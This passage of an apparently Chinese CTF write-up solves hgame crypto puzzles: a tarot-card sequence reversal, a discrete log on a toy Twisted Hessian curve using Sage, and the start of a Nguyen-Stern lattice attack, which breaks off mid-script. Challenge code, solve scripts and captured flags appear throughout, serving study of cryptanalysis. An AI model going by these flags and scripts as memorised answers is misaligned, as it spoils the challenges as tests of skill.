YOUR_initial_FATE.append(<span class="hljs-string">&quot;re-&quot;</span>+card)<br>            <span class="hljs-keyword">else</span>:<br>                YOUR_initial_FATE.append(card)<br>        <span class="hljs-keyword">else</span>:<br>            Value.append(tarot.index(card))<br>            YOUR_initial_FATE.append(card)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">continue</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Oops!lets reverse 1T!&quot;</span>)<br><br>FLAG=(<span class="hljs-string">&quot;hgame&#123;&quot;</span>+<span class="hljs-string">&quot;&amp;&quot;</span>.join(YOUR_initial_FATE)+<span class="hljs-string">&quot;&#125;&quot;</span>).replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;_&quot;</span>)<br><br>YOUR_final_Value = Value<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Fortune_wheel</span>(<span class="hljs-params">FATE</span>):<br>    FATEd = [FATE[i]+FATE[(i+<span class="hljs-number">1</span>)%<span class="hljs-number">5</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(FATE))]<br>    <span class="hljs-keyword">return</span> FATEd<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">250</span>):<br>    YOUR_final_Value = Fortune_wheel(YOUR_final_Value)<br><span class="hljs-built_in">print</span>(YOUR_final_Value)<br>YOUR_final_FATE = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> YOUR_final_Value:<br>    YOUR_final_FATE.append(tarot[i%<span class="hljs-number">78</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Your destiny changed!\n&quot;</span>,<span class="hljs-string">&quot;,&quot;</span>.join(YOUR_final_FATE))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;oh,now you GET th3 GOOd lU&gt;k,^^&quot;</span>)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Oops!lets reverse 1T!</span><br><span class="hljs-string">[2532951952066291774890498369114195917240794704918210520571067085311474675019, 2532951952066291774890327666074100357898023013105443178881294700381509795270, 2532951952066291774890554459287276604903130315859258544173068376967072335730, 2532951952066291774890865328241532885391510162611534514014409174284299139015, 2532951952066291774890830662608134156017946376309989934175833913921142609334]</span><br><span class="hljs-string">Your destiny changed!</span><br><span class="hljs-string"> Eight of Cups,Ace of Cups,Strength,The Chariot,Five of Swords</span><br><span class="hljs-string">oh,now you GET th3 GOOd lU&gt;k,^^</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br></code></pre></td></tr></table></figure><p>逆着分析一下就好了</p><p>就讲一下逆<code>YOUR_final_Value</code>这个</p><p>记上一个状态为<code>a,b,c,d,e</code>，则下一个状态为<code>a+b,b+c,c+d,d+e,e+a</code></p><p>之后看代码里就能理解了<code>e+a-a-b+b+c-c-d+d+e=2e</code>，然后一个个求出来就可以还原了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python">Major_Arcana = [<span class="hljs-string">&quot;The Fool&quot;</span>, <span class="hljs-string">&quot;The Magician&quot;</span>, <span class="hljs-string">&quot;The High Priestess&quot;</span>,<span class="hljs-string">&quot;The Empress&quot;</span>, <span class="hljs-string">&quot;The Emperor&quot;</span>, <span class="hljs-string">&quot;The Hierophant&quot;</span>,<span class="hljs-string">&quot;The Lovers&quot;</span>, <span class="hljs-string">&quot;The Chariot&quot;</span>, <span class="hljs-string">&quot;Strength&quot;</span>,<span class="hljs-string">&quot;The Hermit&quot;</span>, <span class="hljs-string">&quot;Wheel of Fortune&quot;</span>, <span class="hljs-string">&quot;Justice&quot;</span>,<span class="hljs-string">&quot;The Hanged Man&quot;</span>, <span class="hljs-string">&quot;Death&quot;</span>, <span class="hljs-string">&quot;Temperance&quot;</span>,<span class="hljs-string">&quot;The Devil&quot;</span>, <span class="hljs-string">&quot;The Tower&quot;</span>, <span class="hljs-string">&quot;The Star&quot;</span>,<span class="hljs-string">&quot;The Moon&quot;</span>, <span class="hljs-string">&quot;The Sun&quot;</span>, <span class="hljs-string">&quot;Judgement&quot;</span>,<span class="hljs-string">&quot;The World&quot;</span>]<br>wands = [<span class="hljs-string">&quot;Ace of Wands&quot;</span>, <span class="hljs-string">&quot;Two of Wands&quot;</span>, <span class="hljs-string">&quot;Three of Wands&quot;</span>, <span class="hljs-string">&quot;Four of Wands&quot;</span>, <span class="hljs-string">&quot;Five of Wands&quot;</span>, <span class="hljs-string">&quot;Six of Wands&quot;</span>, <span class="hljs-string">&quot;Seven of Wands&quot;</span>, <span class="hljs-string">&quot;Eight of Wands&quot;</span>, <span class="hljs-string">&quot;Nine of Wands&quot;</span>, <span class="hljs-string">&quot;Ten of Wands&quot;</span>, <span class="hljs-string">&quot;Page of Wands&quot;</span>, <span class="hljs-string">&quot;Knight of Wands&quot;</span>, <span class="hljs-string">&quot;Queen of Wands&quot;</span>, <span class="hljs-string">&quot;King of Wands&quot;</span>]<br>cups = [<span class="hljs-string">&quot;Ace of Cups&quot;</span>, <span class="hljs-string">&quot;Two of Cups&quot;</span>, <span class="hljs-string">&quot;Three of Cups&quot;</span>, <span class="hljs-string">&quot;Four of Cups&quot;</span>, <span class="hljs-string">&quot;Five of Cups&quot;</span>, <span class="hljs-string">&quot;Six of Cups&quot;</span>, <span class="hljs-string">&quot;Seven of Cups&quot;</span>, <span class="hljs-string">&quot;Eight of Cups&quot;</span>, <span class="hljs-string">&quot;Nine of Cups&quot;</span>, <span class="hljs-string">&quot;Ten of Cups&quot;</span>, <span class="hljs-string">&quot;Page of Cups&quot;</span>, <span class="hljs-string">&quot;Knight of Cups&quot;</span>, <span class="hljs-string">&quot;Queen of Cups&quot;</span>, <span class="hljs-string">&quot;King of Cups&quot;</span>]<br>swords = [<span class="hljs-string">&quot;Ace of Swords&quot;</span>, <span class="hljs-string">&quot;Two of Swords&quot;</span>, <span class="hljs-string">&quot;Three of Swords&quot;</span>, <span class="hljs-string">&quot;Four of Swords&quot;</span>, <span class="hljs-string">&quot;Five of Swords&quot;</span>, <span class="hljs-string">&quot;Six of Swords&quot;</span>, <span class="hljs-string">&quot;Seven of Swords&quot;</span>, <span class="hljs-string">&quot;Eight of Swords&quot;</span>, <span class="hljs-string">&quot;Nine of Swords&quot;</span>, <span class="hljs-string">&quot;Ten of Swords&quot;</span>, <span class="hljs-string">&quot;Page of Swords&quot;</span>, <span class="hljs-string">&quot;Knight of Swords&quot;</span>, <span class="hljs-string">&quot;Queen of Swords&quot;</span>, <span class="hljs-string">&quot;King of Swords&quot;</span>]<br>pentacles = [<span class="hljs-string">&quot;Ace of Pentacles&quot;</span>, <span class="hljs-string">&quot;Two of Pentacles&quot;</span>, <span class="hljs-string">&quot;Three of Pentacles&quot;</span>, <span class="hljs-string">&quot;Four of Pentacles&quot;</span>, <span class="hljs-string">&quot;Five of Pentacles&quot;</span>, <span class="hljs-string">&quot;Six of Pentacles&quot;</span>, <span class="hljs-string">&quot;Seven of Pentacles&quot;</span>, <span class="hljs-string">&quot;Eight of Pentacles&quot;</span>, <span class="hljs-string">&quot;Nine of Pentacles&quot;</span>, <span class="hljs-string">&quot;Ten of Pentacles&quot;</span>, <span class="hljs-string">&quot;Page of Pentacles&quot;</span>, <span class="hljs-string">&quot;Knight of Pentacles&quot;</span>, <span class="hljs-string">&quot;Queen of Pentacles&quot;</span>, <span class="hljs-string">&quot;King of Pentacles&quot;</span>]<br>Minor_Arcana = wands + cups + swords + pentacles<br>tarot = Major_Arcana + Minor_Arcana<br>reversals = [<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>]<br><br>YOUR_final_Value=[<span class="hljs-number">2532951952066291774890498369114195917240794704918210520571067085311474675019</span>, <span class="hljs-number">2532951952066291774890327666074100357898023013105443178881294700381509795270</span>, <span class="hljs-number">2532951952066291774890554459287276604903130315859258544173068376967072335730</span>, <span class="hljs-number">2532951952066291774890865328241532885391510162611534514014409174284299139015</span>, <span class="hljs-number">2532951952066291774890830662608134156017946376309989934175833913921142609334</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reverse_Fortune_wheel</span>(<span class="hljs-params">FATEd</span>):<br>    f0 = (FATEd[<span class="hljs-number">4</span>] - FATEd[<span class="hljs-number">3</span>] + FATEd[<span class="hljs-number">2</span>] - FATEd[<span class="hljs-number">1</span>] + FATEd[<span class="hljs-number">0</span>]) // <span class="hljs-number">2</span><br>    f1 = FATEd[<span class="hljs-number">0</span>] - f0<br>    f2 = FATEd[<span class="hljs-number">1</span>] - f1<br>    f3 = FATEd[<span class="hljs-number">2</span>] - f2<br>    f4 = FATEd[<span class="hljs-number">3</span>] - f3<br>    <span class="hljs-keyword">return</span> [f0, f1, f2, f3, f4]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">250</span>):<br>    YOUR_final_Value = reverse_Fortune_wheel(YOUR_final_Value)<br><span class="hljs-built_in">print</span>(YOUR_final_Value)<br>YOUR_initial_FATE=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> YOUR_final_Value:<br>    <span class="hljs-keyword">if</span> i&lt;<span class="hljs-number">0</span>:<br>        YOUR_initial_FATE.append(<span class="hljs-string">&#x27;re-&#x27;</span>+tarot[i^-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">else</span>:<br>       YOUR_initial_FATE.append(tarot[i])<br>FLAG=(<span class="hljs-string">&quot;hgame&#123;&quot;</span>+<span class="hljs-string">&quot;&amp;&quot;</span>.join(YOUR_initial_FATE)+<span class="hljs-string">&quot;&#125;&quot;</span>).replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;_&quot;</span>)<br><span class="hljs-built_in">print</span>(FLAG)<br><span class="hljs-comment">#hgame&#123;re-The_Moon&amp;re-The_Sun&amp;Judgement&amp;re-Temperance&amp;Six_of_Cups&#125;</span><br><br></code></pre></td></tr></table></figure><h2 id="intergalactic-bound"><a class="markdownIt-Anchor" href="#intergalactic-bound"></a> Intergalactic Bound</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> secrets <span class="hljs-keyword">import</span> flag<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_THCurve</span>(<span class="hljs-params">P, Q</span>):<br>    <span class="hljs-keyword">if</span> P == (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>):<br>        <span class="hljs-keyword">return</span> Q<br>    <span class="hljs-keyword">if</span> Q == (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>):<br>        <span class="hljs-keyword">return</span> P<br>    x1, y1 = P<br>    x2, y2 = Q<br>    x3 = (x1 - y1 ** <span class="hljs-number">2</span> * x2 * y2) * <span class="hljs-built_in">pow</span>(a * x1 * y1 * x2 ** <span class="hljs-number">2</span> - y2, -<span class="hljs-number">1</span>, p) % p<br>    y3 = (y1 * y2 ** <span class="hljs-number">2</span> - a * x1 ** <span class="hljs-number">2</span> * x2) * <span class="hljs-built_in">pow</span>(a * x1 * y1 * x2 ** <span class="hljs-number">2</span> - y2, -<span class="hljs-number">1</span>, p) % p<br>    <span class="hljs-keyword">return</span> x3, y3<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mul_THCurve</span>(<span class="hljs-params">n, P</span>):<br>    R = (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">while</span> n &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">if</span> n % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>:<br>            R = add_THCurve(R, P)<br>        P = add_THCurve(P, P)<br>        n = n // <span class="hljs-number">2</span><br>    <span class="hljs-keyword">return</span> R<br><br><br>p = getPrime(<span class="hljs-number">96</span>)<br>a = randint(<span class="hljs-number">1</span>, p)<br>G = (randint(<span class="hljs-number">1</span>,p), randint(<span class="hljs-number">1</span>,p))<br>d = (a*G[<span class="hljs-number">0</span>]^<span class="hljs-number">3</span>+G[<span class="hljs-number">1</span>]^<span class="hljs-number">3</span>+<span class="hljs-number">1</span>)%p*inverse(G[<span class="hljs-number">0</span>]*G[<span class="hljs-number">1</span>],p)%p<br>x = randint(<span class="hljs-number">1</span>, p)<br>Q = mul_THCurve(x, G)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;p = <span class="hljs-subst">&#123;p&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;G = <span class="hljs-subst">&#123;G&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Q = <span class="hljs-subst">&#123;Q&#125;</span>&quot;</span>)<br><br>key = hashlib.sha256(<span class="hljs-built_in">str</span>(x).encode()).digest()<br>cipher = AES.new(key, AES.MODE_ECB)<br>flag = pad(flag,<span class="hljs-number">16</span>)<br>ciphertext = cipher.encrypt(flag)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ciphertext=<span class="hljs-subst">&#123;ciphertext&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>Twisted Hessian曲线：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>∗</mo><msup><mi>x</mi><mn>3</mn></msup><mo>∗</mo><mo>+</mo><msup><mi>y</mi><mn>3</mn></msup><mo>+</mo><mn>1</mn><mo>=</mo><mi>d</mi><mo>∗</mo><mi>x</mi><mo>∗</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">a*x^3*+y^3+1=d*x*y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord">+</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></p><p>但不知道参数a和d</p><p>但是通过两个点，可以联立两个方程进行求解</p><p>之后将该曲线映射到ECC上求解</p><p>通过2024羊城杯，可以知道利用sage中的EllipticCurve_from_cubic，可以直接做映射</p><blockquote><p>参考2024羊城杯：<a href="https://tangcuxiaojikuai.xyz/post/689431.html">tangcuxiaojikuai.xyz/post/689431.html</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python">p = <span class="hljs-number">55099055368053948610276786301</span><br>G = (<span class="hljs-number">19663446762962927633037926740</span>, <span class="hljs-number">35074412430915656071777015320</span>)<br>Q = (<span class="hljs-number">26805137673536635825884330180</span>, <span class="hljs-number">26376833112609309475951186883</span>)<br>ciphertext=<span class="hljs-string">b&quot;k\xe8\xbe\x94\x9e\xfc\xe2\x9e\x97\xe5\xf3\x04&#x27;\x8f\xb2\x01T\x06\x88\x04\xeb3Jl\xdd Pk$\x00:\xf5&quot;</span><br><br><span class="hljs-comment"># 定义有限域</span><br>F = GF(p)<br><br><span class="hljs-comment"># 定义多项式环，a 和 d 作为未知量</span><br>R.&lt;a, d&gt; = PolynomialRing(F)<br><br><span class="hljs-comment"># 转换到有限域</span><br>G0, G1 = F(G[<span class="hljs-number">0</span>]), F(G[<span class="hljs-number">1</span>])<br>Q0, Q1 = F(Q[<span class="hljs-number">0</span>]), F(Q[<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># 定义方程</span><br>eq1 = d * G0 * G1 - (a * G0^<span class="hljs-number">3</span> + G1^<span class="hljs-number">3</span> + <span class="hljs-number">1</span>)<br>eq2 = d * Q0 * Q1 - (a * Q0^<span class="hljs-number">3</span> + Q1^<span class="hljs-number">3</span> + <span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># 求解</span><br>solutions = R.ideal(eq1, eq2).variety()<br><br>a=<span class="hljs-built_in">int</span>(solutions[<span class="hljs-number">0</span>][<span class="hljs-string">&quot;a&quot;</span>])<br>d=<span class="hljs-built_in">int</span>(solutions[<span class="hljs-number">0</span>][<span class="hljs-string">&quot;d&quot;</span>])<br>d = (a*G[<span class="hljs-number">0</span>]^<span class="hljs-number">3</span>+G[<span class="hljs-number">1</span>]^<span class="hljs-number">3</span>+<span class="hljs-number">1</span>)%p*inverse_mod(G[<span class="hljs-number">0</span>]*G[<span class="hljs-number">1</span>],p)%p<br><br>R.&lt;x,y,z&gt; = Zmod(p)[]<br>cubic = a*x^<span class="hljs-number">3</span> + y^<span class="hljs-number">3</span> + z^<span class="hljs-number">3</span> - d*x*y*z<br>E = EllipticCurve_from_cubic(cubic,morphism=<span class="hljs-literal">True</span>)<br>G = E(G)<br>Q = E(Q)<br>x = (Q).log(G)<br>x = <span class="hljs-built_in">int</span>(x)<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br>key = hashlib.sha256(<span class="hljs-built_in">str</span>(x).encode()).digest()<br>cipher = AES.new(key, AES.MODE_ECB)<br>flag = cipher.decrypt(ciphertext)<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#b&#x27;hgame&#123;N0th1ng_bu7_up_Up_UP!&#125;\x04\x04\x04\x04</span><br></code></pre></td></tr></table></figure><h2 id="spica"><a class="markdownIt-Anchor" href="#spica"></a> SPiCa</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime, long_to_bytes,bytes_to_long<br><span class="hljs-keyword">from</span> secrets <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">derive_M</span>(<span class="hljs-params">n</span>):<br>    iota=<span class="hljs-number">0.035</span><br>    Mbits=<span class="hljs-built_in">int</span>(<span class="hljs-number">2</span> * iota * n^<span class="hljs-number">2</span> + n * log(n,<span class="hljs-number">2</span>))<br>    M = random_prime(<span class="hljs-number">2</span>^Mbits, proof = <span class="hljs-literal">False</span>, lbound = <span class="hljs-number">2</span>^(Mbits - <span class="hljs-number">1</span>))<br>    <span class="hljs-keyword">return</span> Integer(M)<br><br>m = bytes_to_long(flag).bit_length()<br>n = <span class="hljs-number">70</span><br>p = derive_M(n)<br><br><br>F = GF(p)<br>x = random_matrix(F, <span class="hljs-number">1</span>, n)<br>A = random_matrix(ZZ, n, m, x=<span class="hljs-number">0</span>, y=<span class="hljs-number">2</span>)<br>A[randint(<span class="hljs-number">0</span>, n-<span class="hljs-number">1</span>)] = vector(ZZ, <span class="hljs-built_in">list</span>(<span class="hljs-built_in">bin</span>(bytes_to_long(flag))[<span class="hljs-number">2</span>:]))<br>h = x*A<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;data.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(<span class="hljs-built_in">str</span>(m) + <span class="hljs-string">&quot;\n&quot;</span>)<br>    file.write(<span class="hljs-built_in">str</span>(p) + <span class="hljs-string">&quot;\n&quot;</span>)<br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> h:<br>        file.write(<span class="hljs-built_in">str</span>(item) + <span class="hljs-string">&quot;\n&quot;</span>)<br></code></pre></td></tr></table></figure><p>直接抄就行了<a href="https://0xffff.one/d/2077">https://0xffff.one/d/2077</a></p><blockquote><p>可以先到后面攻击部分开始看，会直观一点</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">import</span> logging<br>logging.basicConfig(<br>    level=logging.DEBUG,<br>    <span class="hljs-built_in">format</span>=<span class="hljs-string">&quot;[%(levelname)s] %(message)s&quot;</span><br>)<br><br><span class="hljs-comment"># https://github.com/Neobeo/HackTM2023/blob/main/solve420.sage</span><br><span class="hljs-comment"># faster LLL reduction to replace `M.LLL()` wiith `flatter(M)`</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flatter</span>(<span class="hljs-params">M, **kwds</span>):<br>    <span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> check_output<br>    <span class="hljs-keyword">from</span> re <span class="hljs-keyword">import</span> findall<br>    M = matrix(ZZ,M)<br>    <span class="hljs-comment"># compile https://github.com/keeganryan/flatter and put it in [imath:0]PATH</span><br>    z = <span class="hljs-string">&#x27;[[&#x27;</span> + <span class="hljs-string">&#x27;]\n[&#x27;</span>.join(<span class="hljs-string">&#x27; &#x27;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>,row)) <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> M) + <span class="hljs-string">&#x27;]]&#x27;</span><br>    ret = check_output([<span class="hljs-string">&quot;flatter&quot;</span>], <span class="hljs-built_in">input</span>=z.encode())<br>    <span class="hljs-keyword">return</span> matrix(M.nrows(), M.ncols(), <span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>,findall(<span class="hljs-string">b&#x27;-?\\d+&#x27;</span>, ret)))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">checkMatrix</span>(<span class="hljs-params">M, wl=[-<span class="hljs-number">1</span>, <span class="hljs-number">1</span>]</span>):<br>  M = [<span class="hljs-built_in">list</span>(_) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>(M)]<br>  ml = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">set</span>(flatten(M)))<br>  logging.debug(ml)<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">sorted</span>(ml) == <span class="hljs-built_in">sorted</span>(wl)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Nguyen_Stern</span>(<span class="hljs-params">h, m, n, M</span>):<br>  B = matrix(ZZ, m)<br>  B[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>] = 